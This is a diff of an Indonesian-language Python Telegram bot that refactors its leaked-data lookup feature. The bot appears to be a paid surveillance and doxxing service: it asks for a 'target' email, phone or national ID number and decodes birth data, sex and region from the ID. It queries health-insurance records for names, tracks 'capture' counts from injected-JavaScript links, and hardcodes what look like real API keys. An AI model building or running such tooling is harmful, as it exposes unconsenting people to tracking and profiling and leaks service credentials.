@@ -40,31 +40,7 @@ try:
 except ImportError:
     TOR_OK = False
 
-# ── bocor tools import ────────────────────────────────────────────────────────
-try:
-    import sys as _sys
-    _sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-    from bocor import (
-        check_email      as bocor_email,
-        check_username   as bocor_username,
-        check_phone      as bocor_phone,
-        check_nik        as bocor_nik,
-        check_password   as bocor_password,
-        load_hibp_metadata,
-        xon_check_email,
-        leaklookup_check,
-        leakcheck_check,
-        merge_breach_names,
-        get_hibp_meta,
-        severity,
-        hibp_password_check,
-        abstract_phone_check,
-        format_phone_id,
-        check_bpjs_pasti_multi,
-    )
-    BOCOR_OK = True
-except ImportError:
-    BOCOR_OK = False
+from bocor import run_bocor
 
 # ================================================================== #
 #  KONFIGURASI
@@ -77,6 +53,9 @@ FREE_LIMIT = 3
 
 RAPIDAPI_KEY  = "227f756b50mshbfbd6f18ab7cf41p17b064jsn0ade51590aae"
 LEAKCHECK_KEY = "99aed655fc285391368f32a9d1bb6d67c01a0a18"
+
+LEAKLOOKUP_KEY  = ""
+ABSTRACTAPI_KEY = ""
 
 PREMIUM_DURATIONS = {
     "1d":  ("1 Hari",    1),
@@ -228,7 +207,6 @@ codeberg https://codeberg.org/{u}
 crunchbase https://www.crunchbase.com/person/{u}
 steemit https://steemit.com/@{u}
 rarible https://rarible.com/{u}
-opensea https://opensea.io/{u}
 etoro https://www.etoro.com/people/{u}
 duolingo https://www.duolingo.com/profile/{u}
 tripadvisor https://www.tripadvisor.com/Profile/{u}
@@ -308,6 +286,7 @@ Tekan tombol 🔍 OSINT Tools di panel utama.
 Fitur tersedia:
 • Username Finder (500+ situs)
 • Breach Check (HIBP + BD + LC)
+• Cek Data Bocor (Email/Username/HP/NIK/Password)
 • Phone Lookup (WA, TG, fintech)
 • Profile Scraper
 • Google Dorking
@@ -454,8 +433,7 @@ def mark_active(link_id, ip):
 def get_online_count():
     now = time.time()
     return sum(1 for t in _active_targets.values() for ts in t.values() if now - ts < 15)
-
-# ================================================================== #
+    # ================================================================== #
 #  JS INJECT
 # ================================================================== #
 INJECT_JS = """
@@ -691,7 +669,6 @@ def cek_situs(nama, pola, username):
     return nama, link, not ada_acak
 
 def osint_username_find(username):
-    """Return list of (nama, link) found."""
     sites = parse_sites()
     sukses = []
     with ThreadPoolExecutor(max_workers=40) as ex:
@@ -1022,7 +999,6 @@ async def _send_offline(link_id, owner_uid):
     total = _cap_counts.get(link_id, 0)
     await bot.send_message(chat_id=owner_uid,
         text=f"🔴 *Target offline* (Link #{link_id})\nTotal capture: {total}", parse_mode="Markdown")
-
 # ================================================================== #
 #  FLASK
 # ================================================================== #
@@ -1187,6 +1163,7 @@ def kb_osint():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("👤 Username Finder",  callback_data="o_username"),
          InlineKeyboardButton("🔓 Breach Check",     callback_data="o_breach")],
+        [InlineKeyboardButton("💧 Cek Data Bocor",   callback_data="o_bocor")],
         [InlineKeyboardButton("📱 Phone Lookup",     callback_data="o_phone"),
          InlineKeyboardButton("🧑 Profile Scraper",  callback_data="o_profile")],
         [InlineKeyboardButton("🌐 Google Dorking",   callback_data="o_dork"),
@@ -1194,18 +1171,7 @@ def kb_osint():
         [InlineKeyboardButton("🪪 NIK Search",       callback_data="o_nik"),
          InlineKeyboardButton("🏥 BPJS Search",      callback_data="o_bpjs")],
         [InlineKeyboardButton("🕵️ Full OSINT",       callback_data="o_full")],
-        [InlineKeyboardButton("💧 Bocor Tools",      callback_data="bocor_menu")],
         [InlineKeyboardButton("« Kembali",           callback_data="back_main")],
-    ])
-
-def kb_bocor():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📧 Cek Email",        callback_data="bocor_email"),
-         InlineKeyboardButton("👤 Cek Username",     callback_data="bocor_username")],
-        [InlineKeyboardButton("📱 Cek No. HP",       callback_data="bocor_phone"),
-         InlineKeyboardButton("🪪 Cek NIK",          callback_data="bocor_nik")],
-        [InlineKeyboardButton("🔑 Cek Password",     callback_data="bocor_password")],
-        [InlineKeyboardButton("« Kembali",           callback_data="osint_menu")],
     ])
 
 def kb_template():
@@ -1431,158 +1397,7 @@ def run_osint_full(uid, username, email, nomor, bot_token):
         await bot.send_message(chat_id=uid,
             text=f"✅ *Full OSINT Selesai*\n\n{laporan}", parse_mode="Markdown")
     asyncio.run(_run())
-
-# ================================================================== #
-#  BOCOR BACKGROUND RUNNERS
-# ================================================================== #
-
-def _bocor_fmt_email(email: str, breach_names: list) -> str:
-    """Format hasil breach ke teks telegram."""
-    if not breach_names:
-        return f"✅ *{email}*\n\nTidak ditemukan di breach manapun."
-    teks = f"⚠️ *{email}*\nditemukan di *{len(breach_names)} breach*:\n\n"
-    for name in breach_names:
-        meta = get_hibp_meta(name) if BOCOR_OK else {}
-        year = meta.get("BreachDate","")[:4] if meta else ""
-        dc = meta.get("DataClasses",[]) if meta else []
-        sev, _ = severity(dc) if (BOCOR_OK and dc) else ("?","")
-        teks += f"🔸 *{name}*" + (f" ({year})" if year else "") + f" — {sev}\n"
-        if dc:
-            teks += f"   _{', '.join(dc[:4])}_\n"
-    return teks
-
-def run_bocor_email(uid: str, email: str, bot_token: str):
-    async def _run():
-        bot = Bot(token=bot_token)
-        await bot.send_message(chat_id=uid, text=f"⏳ Cek breach email `{email}`...", parse_mode="Markdown")
-        try:
-            load_hibp_metadata()
-            xon = xon_check_email(email) or []
-            ll  = leaklookup_check(email, "email_address") or []
-            lc  = leakcheck_check(email) or []
-            merged = merge_breach_names(xon, ll, lc)
-            teks = _bocor_fmt_email(email, merged)
-        except Exception as e:
-            teks = f"❌ Error: {e}"
-        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown",
-                               reply_markup=InlineKeyboardMarkup([[
-                                   InlineKeyboardButton("« Bocor Menu", callback_data="bocor_menu")]]))
-    asyncio.run(_run())
-
-def run_bocor_username(uid: str, username: str, bot_token: str):
-    async def _run():
-        bot = Bot(token=bot_token)
-        await bot.send_message(chat_id=uid, text=f"⏳ Cek breach username `{username}`...", parse_mode="Markdown")
-        try:
-            xon = xon_check_email(username) or []
-            ll  = leaklookup_check(username, "username") or []
-            lc  = leakcheck_check(username) or []
-            merged = merge_breach_names(xon, ll, lc)
-            if not merged:
-                teks = f"✅ Username `{username}` tidak ditemukan di breach manapun."
-            else:
-                teks = f"⚠️ Username `{username}` ditemukan di *{len(merged)} breach*:\n\n"
-                teks += "\n".join(f"🔸 {n}" for n in merged)
-        except Exception as e:
-            teks = f"❌ Error: {e}"
-        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown",
-                               reply_markup=InlineKeyboardMarkup([[
-                                   InlineKeyboardButton("« Bocor Menu", callback_data="bocor_menu")]]))
-    asyncio.run(_run())
-
-def run_bocor_phone(uid: str, nomor: str, bot_token: str):
-    async def _run():
-        bot = Bot(token=bot_token)
-        normalized = format_phone_id(nomor)
-        await bot.send_message(chat_id=uid, text=f"⏳ Cek nomor `+{normalized}`...", parse_mode="Markdown")
-        try:
-            data = abstract_phone_check(normalized)
-            if not data:
-                teks = f"⚠️ Gagal terhubung ke AbstractAPI.\nPastikan `ABSTRACTAPI_KEY` sudah diset di `.env`"
-            else:
-                carrier = data.get("carrier", {})
-                country = data.get("country", {})
-                breaches = data.get("phone_breaches", {})
-                total_b = breaches.get("total_breaches", 0) if isinstance(breaches, dict) else 0
-                teks  = f"📱 *Phone Intel — +{normalized}*\n\n"
-                teks += f"Valid: {'✅' if data.get('valid') else '❌'}\n"
-                teks += f"Negara: {country.get('name','—') if isinstance(country,dict) else country}\n"
-                teks += f"Operator: {carrier.get('name','—') if isinstance(carrier,dict) else carrier}\n"
-                teks += f"Tipe: {data.get('type','—')}\n"
-                if total_b and total_b > 0:
-                    teks += f"\n⚠️ *Breach: {total_b}*\n"
-                    teks += f"Pertama bocor: {breaches.get('date_first_breached','—')}\n"
-                    teks += f"Terakhir bocor: {breaches.get('date_last_breached','—')}\n"
-                else:
-                    teks += "\n✅ Tidak ditemukan di breach."
-        except Exception as e:
-            teks = f"❌ Error: {e}"
-        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown",
-                               reply_markup=InlineKeyboardMarkup([[
-                                   InlineKeyboardButton("« Bocor Menu", callback_data="bocor_menu")]]))
-    asyncio.run(_run())
-
-def run_bocor_nik(uid: str, nik: str, bot_token: str):
-    async def _run():
-        bot = Bot(token=bot_token)
-        await bot.send_message(chat_id=uid, text=f"⏳ Parsing NIK `{nik}`...", parse_mode="Markdown")
-        try:
-            nik = nik.strip()
-            if len(nik) != 16 or not nik.isdigit():
-                await bot.send_message(chat_id=uid, text="❌ NIK tidak valid. Harus 16 digit angka.",
-                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Bocor Menu", callback_data="bocor_menu")]]))
-                return
-            tgl_raw = int(nik[6:8]); bulan = nik[8:10]; tahun_2d = int(nik[10:12])
-            jk = "Perempuan" if tgl_raw > 40 else "Laki-laki"
-            tgl = tgl_raw - 40 if tgl_raw > 40 else tgl_raw
-            tahun_full = 2000 + tahun_2d if tahun_2d <= 24 else 1900 + tahun_2d
-            tgl_str = str(tgl).zfill(2)
-            bulan_map = {"01":"Jan","02":"Feb","03":"Mar","04":"Apr","05":"Mei","06":"Jun",
-                         "07":"Jul","08":"Agt","09":"Sep","10":"Okt","11":"Nov","12":"Des"}
-            await bot.send_message(chat_id=uid,
-                text=f"⏳ Cek BPJS PASTI JKN...", parse_mode="Markdown")
-            bpjs = check_bpjs_pasti_multi(nik, tgl_str, bulan, tahun_full)
-            teks  = f"🪪 *NIK Analysis*\n\n"
-            teks += f"NIK: `{nik}`\n"
-            teks += f"TTL: {tgl_str} {bulan_map.get(bulan,bulan)} {tahun_full}\n"
-            teks += f"JK: {jk}\n"
-            teks += f"Provinsi: Kode `{nik[:2]}`\n"
-            teks += f"Kab/Kota: Kode `{nik[2:4]}`\n"
-            teks += f"Kecamatan: Kode `{nik[4:6]}`\n\n"
-            if bpjs["status"] in ("aktif","nonaktif"):
-                icon = "✅" if bpjs["status"] == "aktif" else "❌"
-                teks += f"BPJS: {icon} *{bpjs['status'].capitalize()}*\n"
-                if bpjs.get("nama"):
-                    teks += f"Nama: *{bpjs['nama']}*\n"
-            else:
-                teks += "BPJS: ⚠️ Tidak ditemukan\n"
-        except Exception as e:
-            teks = f"❌ Error: {e}"
-        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown",
-                               reply_markup=InlineKeyboardMarkup([[
-                                   InlineKeyboardButton("« Bocor Menu", callback_data="bocor_menu")]]))
-    asyncio.run(_run())
-
-def run_bocor_password(uid: str, password: str, bot_token: str):
-    async def _run():
-        bot = Bot(token=bot_token)
-        await bot.send_message(chat_id=uid, text="⏳ Cek password via HIBP k-anonymity...", parse_mode="Markdown")
-        try:
-            count = hibp_password_check(password)
-            if count == -1:
-                teks = "⚠️ Gagal terhubung ke HIBP. Cek koneksi."
-            elif count == 0:
-                teks = "✅ Password *tidak ditemukan* di breach manapun.\n\n🔒 _(Password tidak dikirim utuh — hanya 5 karakter pertama hash SHA1)_"
-            else:
-                teks = f"⚠️ Password ini muncul *{count:,}x* di breach yang diketahui!\n\nSegera ganti password ini di semua akun.\n\n🔒 _(Password tidak dikirim utuh — hanya 5 karakter pertama hash SHA1)_"
-        except Exception as e:
-            teks = f"❌ Error: {e}"
-        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown",
-                               reply_markup=InlineKeyboardMarkup([[
-                                   InlineKeyboardButton("« Bocor Menu", callback_data="bocor_menu")]]))
-    asyncio.run(_run())
-
-# ================================================================== #
+    # ================================================================== #
 #  HANDLERS — /start
 # ================================================================== #
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1653,6 +1468,29 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _user_state[uid] = "osint_breach"
         await q.edit_message_text("🔓 *Breach Check*\n\nKetik email target:", parse_mode="Markdown")
 
+    elif d == "o_bocor":
+        _user_state[uid] = None
+        await q.edit_message_text(
+            "💧 *Cek Data Bocor — MR414N-ID*\n\nPilih jenis data:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📧 Email", callback_data="bocor_email"),
+                 InlineKeyboardButton("👤 Username", callback_data="bocor_username")],
+                [InlineKeyboardButton("📱 Nomor HP", callback_data="bocor_phone"),
+                 InlineKeyboardButton("🪪 NIK", callback_data="bocor_nik")],
+                [InlineKeyboardButton("🔑 Password", callback_data="bocor_password")],
+                [InlineKeyboardButton("« Kembali", callback_data="osint_menu")],
+            ]))
+
+    elif d in ("bocor_email","bocor_username","bocor_phone","bocor_nik","bocor_password"):
+        kind = d.replace("bocor_", "")
+        _user_state[uid] = f"bocor_await_{kind}"
+        lbl = {"email":"Email","username":"Username","phone":"Nomor HP","nik":"NIK","password":"Password"}[kind]
+        await q.edit_message_text(
+            f"💧 *Cek Data Bocor — {lbl}*\n\nKetik yang mau dicek:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Batal", callback_data="o_bocor")]]))
+
     elif d == "o_phone":
         _user_state[uid] = "osint_phone"
         await q.edit_message_text("📱 *Phone Lookup*\n\nKetik nomor HP (contoh: 08xxxxxxxxxx):", parse_mode="Markdown")
@@ -1682,42 +1520,6 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _user_data[uid] = {}
         await q.edit_message_text(
             "🕵️ *Full OSINT*\n\nKetik username (Enter skip ketik `-`):",
-            parse_mode="Markdown")
-
-    # ============================================================
-    #  BOCOR TOOLS
-    # ============================================================
-    elif d == "bocor_menu":
-        if not BOCOR_OK:
-            await q.edit_message_text(
-                "❌ *bocor.py tidak ditemukan!*\n\nPastikan `bocor.py` ada di folder yang sama dengan `say.py`.\n\n`pip install rich requests kodenik`",
-                parse_mode="Markdown",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Kembali", callback_data="osint_menu")]]))
-            return
-        await q.edit_message_text(
-            "💧 *Bocor Tools — MR414N-ID*\n\nCek apakah datamu pernah bocor:",
-            parse_mode="Markdown", reply_markup=kb_bocor())
-
-    elif d == "bocor_email":
-        _user_state[uid] = "bocor_email"
-        await q.edit_message_text("📧 *Cek Email*\n\nKetik email target:", parse_mode="Markdown")
-
-    elif d == "bocor_username":
-        _user_state[uid] = "bocor_username"
-        await q.edit_message_text("👤 *Cek Username*\n\nKetik username:", parse_mode="Markdown")
-
-    elif d == "bocor_phone":
-        _user_state[uid] = "bocor_phone"
-        await q.edit_message_text("📱 *Cek No. HP*\n\nKetik nomor HP (contoh: 08123456789):", parse_mode="Markdown")
-
-    elif d == "bocor_nik":
-        _user_state[uid] = "bocor_nik"
-        await q.edit_message_text("🪪 *Cek NIK*\n\nKetik NIK (16 digit):", parse_mode="Markdown")
-
-    elif d == "bocor_password":
-        _user_state[uid] = "bocor_password"
-        await q.edit_message_text(
-            "🔑 *Cek Password*\n\nKetik password yang mau dicek:\n_(Password tidak dikirim utuh — dilindungi hashing SHA1)_",
             parse_mode="Markdown")
 
     # ============================================================
@@ -2038,32 +1840,14 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                d.get("full_nomor",""), BOT_TOKEN), daemon=True).start()
 
     # ============================================================
-    #  STATE — BOCOR TOOLS
+    #  STATE — CEK DATA BOCOR
     # ============================================================
-    elif state == "bocor_email":
+    elif state and state.startswith("bocor_await_"):
+        kind = state.replace("bocor_await_", "")
         _user_state[uid] = None
-        threading.Thread(target=run_bocor_email,
-                         args=(uid, text, BOT_TOKEN), daemon=True).start()
-
-    elif state == "bocor_username":
-        _user_state[uid] = None
-        threading.Thread(target=run_bocor_username,
-                         args=(uid, text, BOT_TOKEN), daemon=True).start()
-
-    elif state == "bocor_phone":
-        _user_state[uid] = None
-        threading.Thread(target=run_bocor_phone,
-                         args=(uid, text, BOT_TOKEN), daemon=True).start()
-
-    elif state == "bocor_nik":
-        _user_state[uid] = None
-        threading.Thread(target=run_bocor_nik,
-                         args=(uid, text, BOT_TOKEN), daemon=True).start()
-
-    elif state == "bocor_password":
-        _user_state[uid] = None
-        threading.Thread(target=run_bocor_password,
-                         args=(uid, text, BOT_TOKEN), daemon=True).start()
+        cfg = {"leaklookup": LEAKLOOKUP_KEY, "abstractapi": ABSTRACTAPI_KEY}
+        threading.Thread(target=run_bocor,
+                         args=(uid, text, kind, BOT_TOKEN, cfg), daemon=True).start()
 
     # ============================================================
     #  STATE — SPY
@@ -2132,4 +1916,67 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for i, lnk in enumerate(_links):
                 if lnk["id"] == lid:
                     if lnk.get("proc"):
-              
+                        try: lnk["proc"].terminate()
+                        except: pass
+                    _links.pop(i); _page_htmls.pop(lid, None); break
+            await update.message.reply_text(f"✅ Link #{lid} dihapus paksa.", reply_markup=kb_admin())
+        except Exception:
+            await update.message.reply_text("❌ ID tidak valid.", reply_markup=kb_admin())
+        _user_state[uid] = None
+
+    elif state == "a_await_msg_id":
+        _user_data[uid]["msg_target"] = text; _user_state[uid] = "a_await_msg_text"
+        await update.message.reply_text(f"Ketik pesan untuk `{text}`:", parse_mode="Markdown")
+
+    elif state == "a_await_msg_text":
+        target = _user_data[uid].get("msg_target","")
+        try:
+            await Bot(token=BOT_TOKEN).send_message(chat_id=target,
+                text=f"📩 *Pesan dari Admin:*\n\n{text}", parse_mode="Markdown")
+            await update.message.reply_text("✅ Pesan terkirim.", reply_markup=kb_admin())
+        except Exception as e:
+            await update.message.reply_text(f"❌ Gagal: {e}", reply_markup=kb_admin())
+        _user_state[uid] = None; _user_data[uid] = {}
+
+    elif state == "a_await_broadcast":
+        users = db_all_users(); bot = Bot(token=BOT_TOKEN); ok = 0; fail = 0
+        for u_id in users:
+            try:
+                await bot.send_message(chat_id=u_id,
+                    text=f"📢 *Broadcast:*\n\n{text}", parse_mode="Markdown")
+                ok += 1
+            except: fail += 1
+        await update.message.reply_text(f"📢 Broadcast selesai.\n✅ {ok} | ❌ {fail}", reply_markup=kb_admin())
+        _user_state[uid] = None
+
+async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = str(update.effective_user.id)
+    state = _user_state.get(uid)
+    if state != "await_html": return
+    doc = update.message.document
+    if not doc.file_name.endswith(".html"):
+        await update.message.reply_text("❌ Harus file .html"); return
+    await update.message.reply_text("⏳ Memproses file...")
+    try:
+        tfile = await context.bot.get_file(doc.file_id)
+        raw = (await tfile.download_as_bytearray()).decode("utf-8", errors="replace")
+        _user_data[uid]["raw_html"] = raw; _user_state[uid] = "await_mode"
+        await update.message.reply_text("✅ File diterima!\n\nPilih mode:", reply_markup=kb_mode())
+    except Exception as e:
+        await update.message.reply_text(f"❌ Gagal: {e}")
+# ================================================================== #
+#  MAIN
+# ================================================================== #
+def main():
+    print_banner()
+    threading.Thread(target=timer_thread, daemon=True).start()
+    print(f"\n\n  Buka @bot → /start\n")
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CallbackQueryHandler(on_button))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
+    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
+
+if __name__ == "__main__":
+    main()
